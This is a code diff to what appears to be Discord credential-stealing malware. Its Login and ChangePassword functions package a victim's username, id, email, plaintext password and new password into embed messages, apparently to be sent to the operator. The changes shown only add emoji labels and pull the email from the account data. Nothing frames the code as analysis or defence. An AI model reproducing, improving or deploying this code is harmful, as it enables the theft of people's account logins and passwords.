@@ -197,12 +197,12 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "name",
-			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
+			    "value": `🏷️ \`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
                         {
                             "name": "id",
-                            "value": `\`` + json.id + `\``,
+                            "value": `🔖 \`` + json.id + `\``,
                             "inline": true
                         },
                         {
@@ -212,12 +212,12 @@ function Login(email, password, token) {
                         },
                         {
                             "name": "email",
-                            "value": `\`${email}\``,
+                            "value": `✉️ \`${email}\``,
                             "inline": true
                         },
                         {
                             "name": "password",
-                            "value": `\`${password}\``,
+                            "value": `🔑 \`${password}\``,
                             "inline": true		    
                         },
                         {
@@ -284,12 +284,12 @@ function ChangePassword(email, newpassword, token) {
                     "fields": [
                         {
                             "name": "name",
-			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
+			    "value": `🏷️ \`` + json.username + `#` + json.discriminator + `\``,
                             "inline": true
                         },
                         {
                             "name": "id",
-                            "value": `\`` + json.id + `\``,
+                            "value": `🔖 \`` + json.id + `\``,
                             "inline": true
                         },
                         {
@@ -299,12 +299,12 @@ function ChangePassword(email, newpassword, token) {
                         },
                         {
                             "name": "email",
-                            "value": `\`${email}\``,
+                            "value": `✉️ \`${json.email}\``,
                             "inline": true
                         },
                         {
                             "name": "new password",
-                            "value": `\`${newpassword}\``,
+                            "value": `🔑 \`${newpassword}\``,
                             "inline": true		    
                         },
                         {
